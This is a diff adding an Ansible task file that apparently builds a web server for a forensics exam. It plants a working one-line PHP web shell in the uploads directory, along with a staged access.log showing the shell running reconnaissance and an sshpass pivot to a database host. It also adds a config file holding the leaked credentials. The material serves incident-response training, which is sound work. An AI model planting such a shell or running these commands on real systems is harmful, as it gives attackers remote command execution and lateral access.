@@ -1,0 +1,79 @@
+---
+# for-t3-exam web02 — the popped web server: pcap + access.log tell the
+# upload story; the shell history says where they went next (db02).
+
+- name: packages
+  ansible.builtin.apt:
+    name: [apache2, openssh-server]
+    state: present
+    update_cache: true
+
+- name: IR analyst account
+  ansible.builtin.user:
+    name: analyst
+    password: "{{ 'analysis' | password_hash('sha512') }}"
+    shell: /bin/bash
+    home: /home/analyst
+    create_home: true
+    groups: [sudo]
+    append: true
+
+- name: evidence dir + capture
+  ansible.builtin.file:
+    path: /var/evidence
+    state: directory
+    mode: "0755"
+
+- name: the NIDS capture (fullreport scenario)
+  ansible.builtin.copy:
+    src: http-session.pcap
+    dest: /var/evidence/http-session.pcap
+    mode: "0644"
+
+- name: uploads dir + webshell artifact
+  ansible.builtin.file:
+    path: /var/www/html/uploads
+    state: directory
+    owner: www-data
+    group: www-data
+    mode: "0755"
+
+- name: the shell itself
+  ansible.builtin.copy:
+    dest: /var/www/html/uploads/shell.phtml
+    content: "<?php system($_GET['c']); ?>\n"
+    mode: "0644"
+
+- name: access.log — the attack timeline, ends with the db jump
+  ansible.builtin.copy:
+    dest: /var/log/apache2/access.log
+    content: |
+      10.9.9.9 - - [14/Nov/2024:09:12:31 +0000] "POST /upload.php HTTP/1.1" 200 24 "-" "python-requests/2.31"
+      10.9.9.9 - - [14/Nov/2024:09:12:47 +0000] "GET /uploads/shell.phtml?c=id HTTP/1.1" 200 51 "-" "curl/8.5"
+      10.9.9.9 - - [14/Nov/2024:09:13:02 +0000] "GET /uploads/shell.phtml?c=cat%20/etc/hosts HTTP/1.1" 200 87 "-" "curl/8.5"
+      10.9.9.9 - - [14/Nov/2024:09:13:20 +0000] "GET /uploads/shell.phtml?c=grep%20-ri%20db%20/etc%20/opt HTTP/1.1" 200 212 "-" "curl/8.5"
+      10.9.9.9 - - [14/Nov/2024:09:14:05 +0000] "GET /uploads/shell.phtml?c=sshpass%20-p%20DbMaint2024!%20ssh%20dbmaint@db02 HTTP/1.1" 200 33 "-" "curl/8.5"
+    mode: "0644"
+
+- name: db creds in an app config — how they found db02
+  ansible.builtin.file:
+    path: /opt/shop
+    state: directory
+    mode: "0755"
+
+- name: the leaked config
+  ansible.builtin.copy:
+    dest: /opt/shop/db.ini
+    content: |
+      [db]
+      host = db02
+      user = dbmaint
+      pass = DbMaint2024!
+    mode: "0644"
+
+- name: ssh password auth for the analyst
+  ansible.builtin.lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: "^#?PasswordAuthentication"
+    line: "PasswordAuthentication yes"
+  notify: restart sshd
